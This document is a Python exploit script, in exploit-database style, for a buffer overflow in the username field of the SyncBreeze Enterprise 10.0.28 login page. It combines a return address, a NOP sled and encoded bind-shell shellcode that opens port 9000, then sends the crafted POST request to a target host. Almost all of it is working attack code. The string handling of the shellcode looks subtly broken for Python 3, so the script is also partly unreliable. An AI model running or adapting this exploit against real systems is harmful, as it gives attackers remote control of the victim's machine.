# Exploit Title: [SyncBreeze POST username overflow]
# Date: [30-Sep-2017]
# Exploit Author: [Owais Mehtab]
# Vendor Homepage: [http://www.syncbreeze.com]
# Software Link: [http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe]
# Version: [10.0.28]
# Tested on: [Windows 7]

#!/usr/bin/python
import socket
import os
import sys

crash = "A" * 1000
# jmp = 10 09 0c 83 libspp.dll
# bad char = 00 0A 0D 25 26 2B 3D

#bind shell on port 9000
buf =  b""
buf += b"\xbf\x8d\xb5\x92\xbd\xdb\xc5\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x53\x31\x78\x12\x83\xc0\x04\x03\xf5"
buf += b"\xbb\x70\x48\xf9\x2c\xf6\xb3\x01\xad\x97\x3a\xe4"
buf += b"\x9c\x97\x59\x6d\x8e\x27\x29\x23\x23\xc3\x7f\xd7"
buf += b"\xb0\xa1\x57\xd8\x71\x0f\x8e\xd7\x82\x3c\xf2\x76"
buf += b"\x01\x3f\x27\x58\x38\xf0\x3a\x99\x7d\xed\xb7\xcb"
buf += b"\xd6\x79\x65\xfb\x53\x37\xb6\x70\x2f\xd9\xbe\x65"
buf += b"\xf8\xd8\xef\x38\x72\x83\x2f\xbb\x57\xbf\x79\xa3"
buf += b"\xb4\xfa\x30\x58\x0e\x70\xc3\x88\x5e\x79\x68\xf5"
buf += b"\x6e\x88\x70\x32\x48\x73\x07\x4a\xaa\x0e\x10\x89"
buf += b"\xd0\xd4\x95\x09\x72\x9e\x0e\xf5\x82\x73\xc8\x7e"
buf += b"\x88\x38\x9e\xd8\x8d\xbf\x73\x53\xa9\x34\x72\xb3"
buf += b"\x3b\x0e\x51\x17\x67\xd4\xf8\x0e\xcd\xbb\x05\x50"
buf += b"\xae\x64\xa0\x1b\x43\x70\xd9\x46\x0c\xb5\xd0\x78"
buf += b"\xcc\xd1\x63\x0b\xfe\x7e\xd8\x83\xb2\xf7\xc6\x54"
buf += b"\xb4\x2d\xbe\xca\x4b\xce\xbf\xc3\x8f\x9a\xef\x7b"
buf += b"\x39\xa3\x7b\x7b\xc6\x76\x11\x73\x61\x29\x04\x7e"
buf += b"\xd1\x99\x88\xd0\xba\xf3\x06\x0f\xda\xfb\xcc\x38"
buf += b"\x73\x06\xef\x65\xac\x8f\x09\x03\xbc\xd9\x82\xbb"
buf += b"\x7e\x3e\x1b\x5c\x80\x14\x33\xca\xc9\x7e\x84\xf5"
buf += b"\xc9\x54\xa2\x61\x42\xbb\x76\x90\x55\x96\xde\xc5"
buf += b"\xc2\x6c\x8f\xa4\x73\x70\x9a\x5e\x17\xe3\x41\x9e"
buf += b"\x5e\x18\xde\xc9\x37\xee\x17\x9f\xa5\x49\x8e\xbd"
buf += b"\x37\x0f\xe9\x05\xec\xec\xf4\x84\x61\x48\xd3\x96"
buf += b"\xbf\x51\x5f\xc2\x6f\x04\x09\xbc\xc9\xfe\xfb\x16"
buf += b"\x80\xad\x55\xfe\x55\x9e\x65\x78\x5a\xcb\x13\x64"
buf += b"\xeb\xa2\x65\x9b\xc4\x22\x62\xe4\x38\xd3\x8d\x3f"
buf += b"\xf9\xf3\x6f\x95\xf4\x9b\x29\x7c\xb5\xc1\xc9\xab"
buf += b"\xfa\xff\x49\x59\x83\xfb\x52\x28\x86\x40\xd5\xc1"
buf += b"\xfa\xd9\xb0\xe5\xa9\xda\x90"


crash = "A" * 780 + "\x83\x0c\x09\x10" + "\x90"*16 + str(buf)

fuzz="username="+crash+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.168.187.10\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.211.149/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
buffer+="\r\n"
buffer+=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.187.10", 80))
expl.send(bytes(buffer, "latin-1"))
expl.close()
